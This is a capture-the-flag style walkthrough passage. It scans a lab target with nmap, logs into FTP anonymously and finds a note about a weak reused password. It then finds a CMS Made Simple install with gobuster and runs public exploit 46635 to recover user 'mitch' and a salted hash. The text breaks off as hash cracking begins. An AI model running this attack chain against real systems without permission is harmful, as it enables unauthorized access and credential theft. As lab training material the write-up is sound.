## <span style="background-color:yellow;color:#27272a;padding:5px;border-radius:5px">nmap</span> scan

first i will start by scan Target with nmap
command:
```javascript
 nmap -sCV TARGET_IP
```
``Output:``

so there is three ports open : ``21`` , ``80`` , ``2222``

## Connect to ``FTP`` 

AfterSince the ***FTP*** port is open, we will try to access FTP using ``anonymous`` user

```javascript
ftp TARGET_IP
```


```javascript

Connected to the **FTP** server on TARGET_IP using anonymous login, meaning the server allows access without requiring a username and password. After <*successfully logging in*>, a directory listing was performed using ``ls``, revealing a folder named ``pub``. Upon navigating into the pub directory, a file named ``ForMitch.txt`` was found. The file was then downloaded to the local machine using the ``get`` command. Finally, the FTP session was exited using ``exit``


Now let's see what inside  ``ForMitch.txt`` 

```bash
cat ForMitch.txt 
```

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

```



>**We can derive three crucial pieces of information from this.**
>[color=yellow]

:::info
1. There’s a user on the system likely called ``mitch``
2. He has the same password on some application as the system
3. His password is incredibly weak. We’ll likely be able to crack it with rockyou.txt, or if it’s a stronger hash, then a shorter list might also be able to crack it.

## using ``gobuster``

after that i will use gobuster to se hidden directories:

```javascript
gobuster dir -u http://TARGET_IP/ -w /home/kali/Downloads/wordlists/common.txt 
```
``
Output:
``

i found ``/simple`` 
```java
http://TARGET_IP/simple
```

![simple](https://hackmd.io/_uploads/ry94Uzpsye.png)


when i go down and focus on the footer i found: 

![simple2](https://hackmd.io/_uploads/B1_ePzaoJx.png)



i found ``CMS Made Simple`` version 

Then I searched for this version in the ``exploit database``

```
https://www.exploit-db.com/exploits/46635
```

![exploitdb](https://hackmd.io/_uploads/Sy7BOfao1g.png)


After that i download the Exploit file and run it :  

```java
python3 46635.py -u http://TARGET_IP/simple
```

``
Output:

[+] Salt for password found: [redacted]
[+] Username found: mitch

```                 

We have a salted hash for mitch. This looks like MD5, so let’s fire up hashcat.

```basg
